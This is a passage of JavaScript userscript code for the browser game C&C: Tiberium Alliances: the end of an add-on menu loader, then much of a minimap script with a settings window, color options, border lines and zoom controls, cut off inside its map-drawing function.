			//var addonmenu  = Addons.AddonMainMenu.getInstance();		 
			//addonmenu.AddMainMenu("TestMainButton",function(){debugfunction("1");},"ALT+J"); 
			//--SUBMENUS-- 
			//var submenu = addonmenu.AddSubMainMenu("TestSubMenu"); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 1",function(){debugfunction("2");},"ALT+L"); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 2",function(){debugfunction("3");}); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 3",function(){debugfunction("4");}); 
			 
			//function debugfunction(k){ 
            	//console.log("working key:" + k); 
			//} 
		} 
		 
		 
		 
		function AMM_checkIfLoaded() { 
			try { 
				if (typeof qx != 'undefined' && qx.core.Init.getApplication() && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION) && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION).isVisible()) { 
					AMM(); 
				} else { 
					window.setTimeout(AMM_checkIfLoaded, 1000); 
				} 
			} catch (e) { 
				console.log("AMM_checkIfLoaded: ", e); 
			} 
		} 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			window.setTimeout(AMM_checkIfLoaded, 1000); 
            Addons_AddonMainMenu = "install"; 
		} 
	} 
	try { 
		var AMMS = document.createElement("script"); 
		AMMS.innerHTML = "(" + AMMinnerHTML.toString() + ")();"; 
		AMMS.type = "text/javascript"; 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			document.getElementsByTagName("head")[0].appendChild(AMMS); 
		} 
	} catch (e) { 
		console.log("AMMinnerHTML init error: ", e); 
	} 
})();




// ==UserScript== 
// @name			C&C: Tiberium Alliances Map 
// @description		Shows you the region map 
// @namespace		https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @include			https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version			1.6.9 
// @icon        	https://sites.google.com/site/titlemod/home/favicon.png 
// @contributor		Nolana Kane | KSX | 777lexa777 
// @grant			none 
 
// ==/UserScript== 
 
// based on Tiberium Alliances Map (Nolana Kane) v1.8 
// https://userscripts.org/scripts/show/135955 
// contributors: 
// KSX https://userscripts.org/scripts/show/149093 
// 777lexa777 https://userscripts.org/scripts/show/149350 
 
(function () { 
	var TAMap_mainFunction = function () { 
		function createMapTweak() { 
			var TAMap = {}; 
			qx.Class.define("TAMap", { 
				type : "singleton", 
				extend : qx.core.Object, 
				members : { 
					version : "1.6.9", 
					alliances : null, 
					alliancesAreLoaded : false, 
					buttonMap : null, 
					blurInterval : null, 
					drawingNow : false, 
					initZoom : null, 
					isInitialized : false, 
					mapBox : null, 
					mapCanvas : null, 
					canvasElement : null, 
					canvasWidth : null, 
					canvasHeight : null, 
					mapMouseCanvas : null, 
					mapMouseWidget : null, 
					scroll : null, 
					scrollWidget : null, 
					settingsWnd : null, 
					mapUpdateTimer : null, 
					relations : { 
						enemies : null, 
						enemiesById : null, 
						enemyCoords : [], 
						allies : null, 
						nap : null 
					}, 
					swObj : { 
						isLoaded : false, 
						refreshIcon : null, 
						allianceSelect : null, 
						allianceListItem : {}, 
						poiSelect : null, 
						obfSectorName : null, 
						obfAllianceList : null, 
						obfAllianceId : null, 
						obfAllianceName : null, 
						settingFields : {}, 
						labels : {}, 
						chkBoxFields : {}, 
						coordButtons : {} 
					}, 
					line : { 
						1 : { 
							x : null, 
							y : null 
						}, 
						2 : { 
							x : null, 
							y : null 
						} 
					}, 
					visOptions : null, 
					visOpt_DEFAULTS : { 
						selectedAllianceId : -1, 
						selectedAllianceName : "<< None >>", 
						poi : -2, 
						vpWidth : null, 
						vpHeight : null, 
						showEnemies : true, 
						showEnemyRange : true, 
						mapBoxBounds : { 
							height : 500, 
							top : 33, 
							left : 129, 
							width : 500 
						}, 
						settingsWndBounds : { 
							height : 646, 
							top : 48, 
							left : 615, 
							width : 524 
						}, 
						chk : { 
							showAlliancePois : false, 
							showOwnCities : true, 
							showSectionFrame : true, 
							showBorderLine1 : false, 
							showBorderLine2 : false, 
							fadeMap : true 
						}, 
						settingsPanel : { 
							playerColor : "#7F0", // type = 1 
							baseColor : "#550", // type = 2 
							campColor : "midnightblue", // type = 3, CampType=2 
							outpostColor : "royalblue", // type = 3, CampType=3 
							poiColor : "orange", // type = 4, POIType != 0 
							tunnelColor : "forestgreen", // type = 4, POIType = 0 
							enemyBaseColor : "red", 
							allianceTerrainColor : "rgba(255,255,255,0.5)", 
							ownBaseColor : "rgba(0,255,0,0.5)", 
							highlightColor : "rgba(200,255,200,1)", 
							line1start : "800:796", 
							line1end : "1387:921", 
							line1color : "rgba(0,255,0,0.3)", 
							line2start : "800:796", 
							line2end : "1410:830", 
							line2color : "rgba(255,255,0,0.3)", 
							zoomFactor : 3 
						} 
					}, 
 
					initialize : function () { 
						console.log("\nTAMap v" + this.version + ": Loaded"); 
						this.init_vars(); 
						this.init_menuButton(); 
						this.init_mapBox(); 
						this.init_scroll(); 
						this.init_settingsWnd(); 
						this.init_settingsButton(); 
						this.init_mapBox_listeners(); 
						this.isInitialized = true; 
					}, 
 
					init_vars : function () { 
						// cloning 
						var vTemp = JSON.parse(JSON.stringify(this.visOpt_DEFAULTS)); 
						if (localStorage) { 
							var sto = localStorage.getItem("TAMapStorage"); 
							if (sto != null) { 
								// check visOptions integrity against DEFAULTS 
								this.visOptions = JSON.parse(sto); 
								for (var i in vTemp) { 
									if (typeof this.visOptions[i] == "object") { 
										for (var j in vTemp[i]) { 
											if (typeof this.visOptions[i][j] == "undefined") { 
												console.log("\nSolving inconsistency with visOptions." + i + "." + j + "\n"); 
												this.visOptions[i][j] = vTemp[i][j]; 
											} 
										} 
									} else if (typeof this.visOptions[i] == "undefined") { 
										console.log("Solving inconsistency with visOptions." + i); 
										this.visOptions[i] = vTemp[i]; 
									} 
								} 
							} else { 
								this.visOptions = vTemp; 
							} 
						} 
						this.initZoom = this.visOptions.settingsPanel.zoomFactor; 
						this.worldHeight = ClientLib.Data.MainData.GetInstance().get_World().get_WorldHeight(); 
						this.worldWidth = ClientLib.Data.MainData.GetInstance().get_World().get_WorldWidth(); 
						this.canvasHeight = this.worldHeight * this.initZoom; 
						this.canvasWidth = this.worldWidth * this.initZoom; 
					}, 
 
					init_menuButton : function () { 
						this.buttonMap = new qx.ui.form.Button("Map"); 
						this.buttonMap.set({ 
							width : 80, 
							appearance : "button-bar-center", 
							toolTipText : "" 
						}); 
						this.buttonMap.addListener("click", this.toggleMap, this); 
						var mainBar = qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_MENU); 
						mainBar.getChildren()[1].addAt(this.buttonMap, 8, { 
							top : 0, 
							right : 0 
						}); 
					}, 
 
					init_mapBox : function () { 
						// The Map window 
						this.mapBox = new qx.ui.window.Window("Mini-Map  [v" + this.version + "]"); 
						this.mapBox.setPadding(1); 
						this.mapBox.setLayout(new qx.ui.layout.Grow()); 
						// this.mapBox.setLayout(new qx.ui.layout.VBox()); 
						this.mapBox.setShowMaximize(false); 
						this.mapBox.setShowMinimize(false); 
						this.mapBox.moveTo(this.visOptions.mapBoxBounds.left, this.visOptions.mapBoxBounds.top); 
						this.mapBox.setHeight(this.visOptions.mapBoxBounds.height); 
						this.mapBox.setWidth(this.visOptions.mapBoxBounds.width); 
						this.mapBox.setMinWidth(10); 
						this.mapBox.setMinHeight(10); 
						this.mapBox.setBackgroundColor("black"); 
					}, 
 
					init_scroll : function () { 
						var cw = this.canvasWidth; 
						var ch = this.canvasHeight; 
						this.scroll = new qx.ui.container.Scroll(); 
 
						//this.scroll.removeListener("mousewheel", this.scroll._onMouseWheel, this.scroll); 
						this.scroll.addListener("mousewheel", function (evt) { 
							console.log(evt.getWheelDelta()); 
						}, this); 
 
						this.mapBox.add(this.scroll); 
 
						this.scrollWidget = new qx.ui.core.Widget(); 
						this.scrollWidget.setMinHeight(ch); 
						this.scrollWidget.setMinWidth(cw); 
						this.scrollWidget.setHeight(ch); 
						this.scrollWidget.setWidth(cw); 
						this.scroll.add(this.scrollWidget); 
 
						this.canvasElement = new qx.html.Element("canvas", null, { 
								id : "map", 
								width : cw, 
								height : ch 
							}); 
						this.canvasElement.addListener("appear", function () { 
							//console.log("appeared:" + this.canvasElement.getDomElement()); 
							this.createMapCanvas(); 
						}, this); 
						this.scrollWidget.getContentElement().add(this.canvasElement); 
					}, 
 
					init_settingsWnd : function () { 
						try { 
							/* select box for alliances */ 
							var selectBox = new qx.ui.form.SelectBox(); 
							var _this = this; 
							selectBox.addListener("changeSelection", function (e) { 
								try { 
									if (e != null && e.getData() && e.getData().length > 0) { 
										var mod = e.getData()[0].getModel(); 
										console.log("Alliance selected: "); 
										console.log(mod); 
										console.log("e.getData()[0]: "); 
										console.log(e.getData()[0]); 
 
										this.visOptions.selectedAllianceId = mod; // alliance ID or -1 for none 
										console.log("saved: " + mod); 
										this.visOptions.selectedAllianceName = this.swObj.allianceListItem[mod].getLabel(); 
										if (this.visOptions.selectedAllianceId != -1) { 
											this.swObj.chkBoxFields.showAlliancePois.setEnabled(true); 
										} 
 
										this.saveOptions(); 
										this.updateMap(); 
									} 
								} catch (err) { 
									console.log("alliance changeSelection error:"); 
									console.log(err); 
								} 
							}, this); 
							this.swObj.allianceSelect = selectBox; 
 
							// this.mapBox.add(selectBox); 
 
							/* Select box for POI Type */ 
							selectBox = new qx.ui.form.SelectBox(); 
 
							var currentSelection = this.visOptions.poi || -2; 
							var makePoiItem = function (model, name) { 
								var item = new qx.ui.form.ListItem(name, null, model); 
								selectBox.add(item); 
								if (currentSelection == model) { 
									selectBox.setSelection([item]); 
								} 
							} 
 
							FPOI = ClientLib.Data.WorldSector.WorldObjectPointOfInterest.EPOIType; 
							makePoiItem(-2, "<< All >>"); 
							makePoiItem(-1, "<< None >>"); 
							makePoiItem(FPOI.TiberiumMine, "Tiberium"); 
							makePoiItem(FPOI.CrystalMine, "Crystal"); 
							makePoiItem(FPOI.PowerVortex, "Reactor"); 
							makePoiItem(FPOI.Infantery, "Tungsten INF"); 
							makePoiItem(FPOI.Vehicle, "Uranium VEH"); 
							makePoiItem(FPOI.Air, "Aircraft"); 
							makePoiItem(FPOI.Defense, "Resonator DEF"); 
							//makePoiItem(FPOI.TunnelExit,"Tunnel Exit"); 
 
							/* ClientLib.Base.EPOIType is not consistent with ClientLib.Data.WorldSector.WorldObjectPointOfInterest.EPOIType 
							makePoiItem(ClientLib.Base.EPOIType.AirBonus, "Aircraft GNT (Off Air)"); 
							makePoiItem(ClientLib.Base.EPOIType.CrystalBonus, "Crystal CNH"); 
							makePoiItem(ClientLib.Base.EPOIType.DefenseBonus, "Resonator NT (Def)"); 
							makePoiItem(ClientLib.Base.EPOIType.InfanteryBonus, "Tungsten C (Off Inf)"); 
							makePoiItem(ClientLib.Base.EPOIType.PowerBonus, "Reactor (Power Bonus)"); 
							makePoiItem(ClientLib.Base.EPOIType.TiberiumBonus, "Tiberium CN"); 
							makePoiItem(ClientLib.Base.EPOIType.VehicleBonus, "Uranium C (Off Vehicles)"); 
							 */ 
 
							selectBox.addListener("changeSelection", function (e) { 
								try { 
									if (e != null && e.getData() && e.getData().length > 0) { 
										console.log("POI selected " + e.getData()[0].getModel()); 
										_this.visOptions.poi = e.getData()[0].getModel(); // POI ID or -2 for all 
										this.saveOptions(); 
										this.updateMap(); 
									} 
								} catch (err) { 
									console.log(err); 
								} 
							}, this); 
							this.swObj.poiSelect = selectBox; 
 
 
							/* Settings Window */ 
							this.settingsWnd = new qx.ui.window.Window("Map Settings"); 
							this.settingsWnd.setPadding(10); 
							//this.mapBox.setLayout(new qx.ui.layout.Grow()); 
 
							var layout = new qx.ui.layout.Grid(); 
							layout.setSpacing(5); 
							layout.setColumnAlign(0, "right", "center"); 
							layout.setColumnAlign(1, "left", "center"); 
							layout.setColumnAlign(2, "left", "center"); 
							layout.setColumnAlign(3, "right", "center"); 
							layout.setColumnAlign(4, "left", "center"); 
							this.settingsWnd.setLayout(layout); 
							this.settingsWnd.setShowMaximize(false); 
							this.settingsWnd.setShowMinimize(false); 
							this.settingsWnd.moveTo(this.visOptions.settingsWndBounds.left, this.visOptions.settingsWndBounds.top); 
							this.settingsWnd.setHeight(this.visOptions.settingsWndBounds.height); 
							this.settingsWnd.setWidth(this.visOptions.settingsWndBounds.width); 
							this.settingsWnd.setMinWidth(10); 
							this.settingsWnd.setMinHeight(10); 
							this.settingsWnd.addListener("close", function () { 
								this.visOptions.settingsWndBounds = this.settingsWnd.getBounds(); 
								this.saveOptions(); 
							}, this); 
 
							/* Reset Button */ 
							var resetAllOptions = new qx.ui.form.Button("Full Reset"); 
							resetAllOptions.set({ 
								appearance : "button-text-small", 
								toolTipText : '<div style="color:#F22">Reset All options to default</div>', 
							}); 
 
							resetAllOptions.addListener("click", function () { 
								if (confirm("Are you sure? This will return all settings to default.")) { 
									this.visOptions = JSON.parse(JSON.stringify(this.visOpt_DEFAULTS)); 
									this.saveOptions(); 
									for (var option in this.visOptions.chk) { 
										//console.log("this.visOptions.chk." + option + " == " + this.visOptions.chk[option]); 
										if (this.swObj.chkBoxFields[option]) { 
											this.swObj.chkBoxFields[option].setValue(this.visOptions.chk[option]); 
										} else { 
											console.log(option + " ::: chkBoxFields does not exist.") 
										} 
									} 
									for (var option in this.visOptions.settingsPanel) { 
										if (option == "chk") { 
											//do nothing 
										} else if (this.swObj.settingFields[option]) { 
											this.swObj.settingFields[option].setValue(String(this.visOptions.settingsPanel[option])); 
										} else { 
											console.log(option + " :: settingFields does not exist.") 
										} 
									} 
									this.updateMap(); 
									this.scrollMapBox(false); 
								} 
							}, this); 
							this.settingsWnd.add(resetAllOptions, { 
								row : 14, 
								column : 4 
							}); 
 
							this.makeLbl("- Highlight -", 0, 0); 
							this.makeLbl("Alliance POIs:", 1, 0); 
							this.settingsWnd.add(this.swObj.allianceSelect, { row : 1, column : 1 }); 
 
							this.refreshIcon = new qx.ui.basic.Image("FactionUI/icons/icon_refresh_funds.png"); 
							this.settingsWnd.add(this.refreshIcon, { row : 1,column : 2 }); 
 
							this.refreshIcon.addListener("click", function () { 
								this.populateAllianceSelect(); 
							}, this); 
 
							this.makeLbl("POIs:", 2, 0); 
							this.settingsWnd.add(this.swObj.poiSelect, { 
								row : 2, 
								column : 1 
							}); 
							this.makeLbl("Alliance POIs:", 3, 0); 
							/* Checkbox for alliance POIs */ 
							this.makeCheckbox("showAlliancePois",3,1); 
							if (this.visOptions.selectedAllianceId == -1) { 
								this.swObj.chkBoxFields.showAlliancePois.setEnabled(false); 
							} 
							this.makeLbl("Own Cities:", 4, 0); 
							/* Checkbox for own bases */ 
							this.makeCheckbox("showOwnCities",4,1); 
							this.makeLbl("Viewport Frame:", 5, 0); 
							/* Checkbox for showSectionFrame */ 
							this.makeCheckbox("showSectionFrame",5,1); 
 
							bt = new qx.ui.basic.Label("- Colors -").set({ 
									value : '<a href="http://www.w3schools.com/html/html_colornames.asp" style="font-size:16px;font-weight:bold;color:orange" target="_blank">- Colors -</a>', 
									rich : true, 
									selectable : true 
								}); 
							this.settingsWnd.add(bt, { 
								row : 6, 
								column : 1, 
							}); 
							// bt.addListener("click", function() { window.open("http://www.w3schools.com/html/html_colornames.asp") }); 
 
 
							this.makeLbl("Alliance Terrain:", 7, 0); 
							this.makeTxt("allianceTerrainColor", 7, 1); 
 
							this.makeLbl("Forg. Base:", 8, 0); 
							this.makeTxt("baseColor", 8, 1); 
 
							this.makeLbl("Camp:", 9, 0); 
							this.makeTxt("campColor", 9, 1); 
 
							this.makeLbl("Player:", 10, 0); 
							this.makeTxt("playerColor", 10, 1); 
 
							this.makeLbl("Enemy:", 11, 0); 
							this.makeTxt("enemyBaseColor", 11, 1); 
							//this.swObj.settingFields.enemyBaseColor.setEnabled(false); 
 
							this.makeLbl("Outpost:", 12, 0); 
							this.makeTxt("outpostColor", 12, 1); 
 
							this.makeLbl("POI:", 13, 0); 
							this.makeTxt("poiColor", 13, 1); 
 
							this.makeLbl("Tunnel:", 14, 0); 
							this.makeTxt("tunnelColor", 14, 1); 
 
							this.makeLbl("Own Base:", 15, 0); 
							this.makeTxt("ownBaseColor", 15, 1); 
							//this.swObj.settingFields.ownBaseColor.setEnabled(false); 
 
							this.makeLbl("Highlight:", 16, 0); 
							this.makeTxt("highlightColor", 16, 1); 
							//this.swObj.settingFields.highlightColor.setEnabled(false); 
 
							/* Line Options */ 
							this.makeLbl(",.-^-.,", 0, 2, "'-.,.-'", "green"); 
 
							this.makeLbl("- Line -", 0, 3); 
 
 
							this.makeLbl("Show Line", 1, 3); 
							/* Checkbox for showBorderLine1 */ 
							this.makeCheckbox("showBorderLine1",1,4); 
 
							this.makeLbl("Line Start:", 2, 3); 
							this.makeTxt("line1start", 2, 4); 
							this.makeCoordsSelectionButton("line1start", 2, 5, "\u2607"); 
 
							this.makeLbl("Line End:", 3, 3); 
							this.makeTxt("line1end", 3, 4); 
							this.makeCoordsSelectionButton("line1end", 3, 5, "\u2613"); 
 
							this.makeLbl("Line 1 Color:", 4, 3); 
							this.makeTxt("line1color", 4, 4); 
 
							this.makeLbl("Show Line 2", 5, 3); 
							/* Checkbox for showBorderLine2 */ 
							this.makeCheckbox("showBorderLine2",5,4); 
 
							this.makeLbl("Line Start:", 6, 3); 
							this.makeTxt("line2start", 6, 4); 
							this.makeCoordsSelectionButton("line2start", 6, 5, "\u2607"); 
 
							this.makeLbl("Line End:", 7, 3); 
							this.makeTxt("line2end", 7, 4); 
							this.makeCoordsSelectionButton("line2end", 7, 5, "\u2613"); 
 
							this.makeLbl("Line 2 Color:", 8, 3); 
							this.makeTxt("line2color", 8, 4); 
							 
							this.makeLbl("Fade Map ?", 9, 3); 
							this.makeCheckbox("fadeMap",9, 4); 
							 
 
							/* Zoom Buttons */ 
							this.makeLbl("Zoom Experimental!", 11, 4, null, "red"); 
							this.makeLbl("Zoom Factor:", 12, 3); 
							this.makeTxt("zoomFactor", 12, 4); 
							this.swObj.settingFields.zoomFactor.setValue(String(this.initZoom)); 
							this.swObj.settingFields.zoomFactor.setTextAlign("right"); 
							this.swObj.settingFields.zoomFactor.setEnabled(false); 
							var btnZoomIn = new qx.ui.form.Button("Zoom In"); 
							btnZoomIn.set({ 
								appearance : "button-text-small", 
								toolTipText : '<div style="color:#FFAAAA">!!!</div>you might need to reload after zooming in', 
							}); 
							btnZoomIn.addListener("click", function () { 
								//increment +0.2 
								this.visOptions.settingsPanel.zoomFactor = Math.round((this.visOptions.settingsPanel.zoomFactor + 0.2) * 10) / 10; 
								this.swObj.settingFields.zoomFactor.setValue(String(this.visOptions.settingsPanel.zoomFactor)); 
								this.saveOptions(); 
								//this.fixScrollBounds(); 
								this.updateMapDelayed(); 
								this.scrollMapBox(true); // re-center 
							}, this); 
							this.settingsWnd.add(btnZoomIn, { 
								row : 13, 
								column : 3, 
							}); 
 
							var btnZoomOut = new qx.ui.form.Button("Zoom Out"); 
							btnZoomOut.set({ 
								appearance : "button-text-small", 
								//toolTipText : "tuO mooZ" 
							}); 
							this.settingsWnd.add(btnZoomOut, { 
								row : 13, 
								column : 4 
							}); 
							btnZoomOut.addListener("click", function () { 
								this.visOptions.settingsPanel.zoomFactor = Math.round((this.visOptions.settingsPanel.zoomFactor - 0.2) * 10) / 10; 
								this.swObj.settingFields.zoomFactor.setValue(String(this.visOptions.settingsPanel.zoomFactor)); 
								this.saveOptions(); 
								this.updateMap(); 
								this.scrollMapBox(false); // re-center 
							}, this); 
 
							/* "Apply" button */ 
							var applyOptions = new qx.ui.form.Button("\u2611"); 
							applyOptions.set({ 
								appearance : "button-text-small", 
								toolTipText : "Save and apply changes to lines colors" 
							}); 
							applyOptions.addListener("click", function () { 
								this.saveOptions(); 
								this.updateMap(); 
								this.scrollMapBox(false); 
							}, this); 
							this.settingsWnd.add(applyOptions, { 
								row : 16, 
								column : 5 
							}); 
 
							/* this.settingsWnd.addListener("appear", function () { 
							console.log("settingsWnd appear event fired"); 
							// this.populateAllianceSelect(); 
							}, this); 
							 */ 
 
							this.swObj.isLoaded = true; 
						} catch (err) { 
							console.log(err); 
						} 
					}, 
 
					setMapUpdateTimer : function () { 
						var _this = this; 
						clearTimeout(this.mapUpdateTimer);  
						if (this.mapBox.isVisible()){ 
							this.mapUpdateTimer = setTimeout(function (){ 
								_this.updateMap(); 
								_this.scrollMapBox(); 
							}, 1000); 
						} 
					}, 
					 
					init_mapBox_listeners : function () { 
						// Gets called A LOT while "scrolling" 
						phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance().get_Region(), "PositionChange", ClientLib.Vis.PositionChange, this, this.setMapUpdateTimer); 
						 
						this.mapBox.addListener("close", function () { 
							if (this.settingsWnd.isVisible()) { 
								this.visOptions.settingsWndBounds = this.settingsWnd.getBounds(); 
								this.settingsWnd.close(); 
							} 
 
							this.visOptions.mapBoxBounds = this.mapBox.getBounds(); 
							this.saveOptions(); 
						}, this); 
 
						this.mapBox.addListener("blur", function () { 
							var _this = this; 
							this.blurInterval = setInterval(function () { 
									if (!_this.settingsWnd.isVisible() && _this.visOptions.chk.fadeMap) { 
										_this.mapBox.setOpacity(0.5); 
										clearInterval(this.blurInterval); 
									} 
								}, 1000) 
						}, this); 
						this.mapBox.addListener("focus", function () { 
							//console.log("focus"); 
							clearInterval(this.blurInterval); 
							this.mapBox.setOpacity(1); 
						}, this); 
						this.mapBox.addListener("mouseover", function () { 
							this.mapBox.focus(); 
						}, this); 
 
						this.mapBox.addListener("resize", function () { 
							var _this = this; 
							setTimeout(function (e) { 
								_this.scrollMapBox(false); 
							}, 1000); 
							//console.log("resized"); 
							//this.updateMap(); 
						}, this); 
					}, 
 
					init_settingsButton : function () { 
						/* Settings Button */ 
						var bt = new qx.ui.form.Button("Settings"); 
						bt.set({ 
							appearance : "button-text-small", 
							toolTipText : "Set filters for the map" 
						}); 
						bt.addListener("click", function () { 
							if (this.settingsWnd.isVisible()) { 
								this.settingsWnd.close(); 
							} else { 
								this.settingsWnd.moveTo(this.visOptions.settingsWndBounds.left, this.visOptions.settingsWndBounds.top); 
								this.settingsWnd.open(); 
							} 
						}, this); 
						this.mapBox.getChildControl("captionbar").add(bt, { 
							row : 0, 
							column : 5 
						}); 
					}, 
 
					init_mapMouse : function () { 
						var cw = this.canvasWidth; 
						var ch = this.canvasHeight; 
						 
						//this.mapMouseWidget.removeAll(); 
						//this.scrollWidget.removeAll(); 
						var vW = this.visOptions.vpWidth; 
						var vH = this.visOptions.vpHeight; 
						this.mapMouseWidget = new qx.html.Element("canvas", null, { 
								id : "mapCursor", 
								width : cw, 
								height : ch 
							}); 
						var cnv = this.mapMouseWidget.getDomElement(); 
						this.mapMouseCanvas = cnv; 
						var ctx = this.mapMouseCanvas.getContext('2d'); 
						ctx.strokeStyle = "rgb(200,0,0)"; 
						ctx.lineWidth = 1; 
						ctx.beginPath(); 
						ctx.moveTo(vW / 2, vH / 2); 
						ctx.lineTo(cw, ch); 
						ctx.stroke(); 
					}, 
 
					createMapCanvas : function () { 
						try { 
							var canvas = this.canvasElement.getDomElement(); 
							if (this.mapCanvas == null) { 
								this.mapCanvas = canvas; 
								var _this = this; 
								/* 
								this.mapCanvas.addEventListener("mousedown", function (evt) { 
								//start drag tracking 
								},this); 
								 */ 
								this.mapCanvas.addEventListener("mousedown", function (evt) { 
									try { 
										var cnv = _this.mapCanvas.getBoundingClientRect(); 
										var mouseX = evt.clientX - cnv.left; 
										var mouseY = evt.clientY - cnv.top; 
										var zf = _this.visOptions.settingsPanel.zoomFactor; 
										//console.log("clientX:Y:" + evt.clientX + ":" + evt.clientY); 
										//console.log("offsets:" + cnv.left + "," + cnv.top); 
										//console.log("M:" + mouseX + "," + mouseY); 
 
										var vm = ClientLib.Vis.VisMain.GetInstance(); 
										vm.CenterGridPosition(mouseX / zf, mouseY / zf); 
 
										_this.scrollMapBox(true); 
 
										setTimeout(function () { 
											_this.updateMap(); 
										}, 500); 
									} catch (err) { 
										console.log(err); 
									} 
								}, false); 
 
							} 
							this.updateMap(); 
							this.scrollMapBox(false); 
						} catch (err) { 
							console.log("createMapCanvas error:"); 
							console.log(err); 
						} 
					}, 
 
					fixScrollBounds : function () { 
						try { 
							var cw = this.canvasWidth; 
							var ch = this.canvasHeight; 
							/* 
							this.scrollWidget.setMinHeight(ch); 
							this.scrollWidget.setMinWidth(cw); 
							this.scrollWidget.setHeight(ch); 
							this.scrollWidget.setWidth(cw); 
							 */ 
							this.canvasElement.removeAll(); 
							this.canvasElement = new qx.html.Element("canvas", null, { 
									id : "map", 
									width : cw, 
									height : ch 
								}); 
							//this.mapCanvas = this.canvasElement.getDomElement(); 
							this.createMapCanvas(); 
							/* 
							var ctx = this.mapCanvas.getContext('2d'); 
							ctx.clearRect(0, 0, canvas.width, canvas.height); 
							ctx.canvas.height = ch; 
							ctx.canvas.width = cw; 
							 */ 
						} catch (e) { 
							console.log("foooooooooooooook: "); 
							console.log(e); 
						} 
					}, 
 
					scrollMapBox : function (preFrameFlag) { 
						// ScrollTo 
						try { 
							var vm = ClientLib.Vis.VisMain.GetInstance(); 
							var zf = parseFloat(this.visOptions.settingsPanel.zoomFactor); 
 
							var viewTopLeftX = vm.get_Region().get_PosX() / vm.get_Region().get_GridWidth() * zf; 
							var viewTopLeftY = vm.get_Region().get_PosY() / vm.get_Region().get_GridHeight() * zf; 
							var viewWidth = vm.get_Region().get_ViewWidth() / vm.get_Region().get_ZoomFactor() / vm.get_Region().get_GridWidth() * zf; 
							var viewHeight = vm.get_Region().get_ViewHeight() / vm.get_Region().get_ZoomFactor() / vm.get_Region().get_GridHeight() * zf; 
 
							var ownCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
							var cx = ownCity.get_PosX(); 
							var cy = ownCity.get_PosY(); 
							//console.log("city: "+cx*zf+","+cy*zf); 
							//console.log("view: "+viewTopLeftX+","+viewTopLeftY); 
							//console.log("vh: "+viewHeight); 
							//console.log("vw: "+viewWidth); 
 
							var mb = this.mapBox.getBounds(); 
							this.scroll.setWidth(mb.width - 37); 
							this.scroll.setHeight(mb.height - 70); 
							var wd = Math.round((mb.width - 37) / 2); 
							var ht = Math.round((mb.height - 70) / 2); 
							this.visOptions.vpWidth = wd; 
							this.visOptions.vpHeight = ht; 
							//console.log("wd: "+wd); 
							//console.log("ht: "+ht); 
 
							var sx = this.scroll.getScrollX(); 
							var sy = this.scroll.getScrollY(); 
							var stx = Math.round((viewTopLeftX + (viewWidth / 2)) - wd); 
							this.scroll.scrollToX(stx); 
							var sty = Math.round((viewTopLeftY + (viewHeight / 2)) - ht); 
							this.scroll.scrollToY(sty); 
 
							if (this.visOptions.chk.showSectionFrame && preFrameFlag) { 
								var ctx = this.mapCanvas.getContext('2d'); 
								ctx.strokeStyle = "rgba(255,0,0,0.5)"; 
								ctx.lineWidth = 1; 
								ctx.strokeRect(viewTopLeftX, viewTopLeftY, viewWidth, viewHeight); 
							} 
						} catch (err) { 
							console.log("scrollMapBox error:"); 
							console.log(err); 
						} 
					}, 
 
					makeLbl : function (name, r, c, tooltiptxt, color) { 
						var lbl = this.swObj.labels["r"+r+"c"+c] = new qx.ui.basic.Label(name); 
						lbl.setTextColor(color || "white"); 
						lbl.setToolTipText(tooltiptxt || ""); 
						lbl.setHeight(28); 
						this.settingsWnd.add(lbl, { 
							row : r, 
							column : c 
						}); 
					}, 
 
					makeTxt : function (option, r, c, color) { 
						var value = this.visOptions.settingsPanel[option]; 
						var txtField = new qx.ui.form.TextField(String(value)); 
						txtField.setTextColor(color || "white"); 
						this.swObj.settingFields[option] = txtField; 
						this.settingsWnd.add(txtField, { 
							row : r, 
							column : c 
						}); 
					}, 
 
					makeCheckbox : function (option, r, c) { 
						var o = this.swObj.chkBoxFields[option] = new qx.ui.form.CheckBox(); 
						o.setValue(this.visOptions.chk[option]); 
						o.addListener("changeValue", function () { 
							this.visOptions.chk[option] = o.getValue(); 
							this.saveOptions(); 
							this.updateMap(); 
						},this); 
						this.settingsWnd.add(o, { 
							row : r, 
							column : c 
						}); 
					}, 
							 
					makeCoordsSelectionButton : function (option, row, col, text) { 
						this.swObj.coordButtons[option] = new qx.ui.form.Button(text).set({ 
								appearance : "button-text-small", 
								toolTipText : "Select a target or your own base on the map then click this to get the coords" 
							}); 
						this.settingsWnd.add(this.swObj.coordButtons[option], { 
							row : row, 
							column : col 
						}); 
						this.swObj.coordButtons[option].setWidth(30); 
						this.swObj.coordButtons[option].addListener("click", function () { 
							var x, 
							y; 
							var selObj = ClientLib.Vis.VisMain.GetInstance().get_SelectedObject(); 
							//console.log(selObj); 
							var notSelObj = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity() || ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
							//console.log(notSelObj); 
							if (selObj != null) { 
								x = selObj.get_RawX(); 
								y = selObj.get_RawY(); 
							} else if (notSelObj != null) { 
								x = notSelObj.get_PosX(); 
								y = notSelObj.get_PosY(); 
							} 
							var str = x + ":" + y; 
 
							this.swObj.settingFields[option].setValue(str); 
							this.saveOptions(); 
							this.updateMap(); 
 
						}, this); 
					}, 
 
					updateMapDelayed : function () { 
						var _this = this; 
						setTimeout(function(){ 
							_this.updateMap(); 
						},1000); 
					}, 
					 
					updateMap : function () { 
						this.drawingNow = true; 
						var md = ClientLib.Data.MainData.GetInstance(); 
						var w = ClientLib.Data.MainData.GetInstance().get_World(); 
						var vm = ClientLib.Vis.VisMain.GetInstance(); //get_Region().get_ViewWidth() 
						var rg = ClientLib.Vis.VisMain.GetInstance().get_Region(); // GetObjectFromPosition(oporcamp,coords).get_CampType() 
						var canvas = this.mapCanvas; 
						var ctx = canvas.getContext('2d'); 
